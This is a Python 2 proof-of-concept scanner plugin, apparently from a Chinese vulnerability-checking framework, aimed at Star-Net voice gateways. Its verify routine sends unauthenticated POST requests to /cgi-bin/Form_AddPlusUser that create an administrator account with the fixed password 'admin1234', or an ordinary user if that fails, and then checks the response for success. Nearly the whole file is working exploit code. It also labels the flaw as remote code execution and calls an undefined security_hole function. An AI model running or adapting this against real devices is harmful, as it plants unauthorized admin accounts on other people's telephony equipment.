# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import random

class Vuln(ABVuln):
    vuln_id = 'STAR-NET_0002' # 平台漏洞编号，留空
    name = '星网锐捷语音网关 任意添加管理员'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        星网锐捷语音网关（STAR-NET）任意添加管理员。
        /cgi-bin/Form_AddPlusUser
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '语音网关'  # 漏洞应用名称
    product_version = '星网锐捷语音网关'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '2732f1d6-44e3-4875-bb6c-e7735f2505cb'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            arg = self.target
            #任意添加管理员
            username = 'test_vul_' + str(random.randint(1111, 9999))
            post = 'plus_type=1&plus_username={username}&plus_password=admin1234&plus_confirm=admin1234&btn_addplus=Add'.format(username=username)
            content_type = 'Content-Type: application/x-www-form-urlencoded'
            url = arg + '/cgi-bin/Form_AddPlusUser'
            #proxy = ('127.0.0.1', 8887)
            code, head, res, err, _ = hh.http(url, header=content_type, post=post)
            #print code, head, res
            #flag=23/24表示添加管理员成功
            if (code == 200 or code == 302) and ('password.asp?flag=23' in res or 'password.asp?flag=24' in res):
                security_hole('任意添加管理员:' + url + ' POST:' +post)
            else:
                #添加管理员账户不成功，尝试添加普通账户（管理员账户最多有4个）
                post = 'plus_type=0&plus_username={username}&plus_password=admin1234&plus_confirm=admin1234&btn_addplus=Add'.format(username=username)
                code, head, res, err, _ = hh.http(url, header=content_type, post=post)
                if (code == 200 or code == 302) and ('password.asp?flag=23' in res or 'password.asp?flag=24' in res):
                    #security_hole('任意添加用户:' + url + ' POST:' +post)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
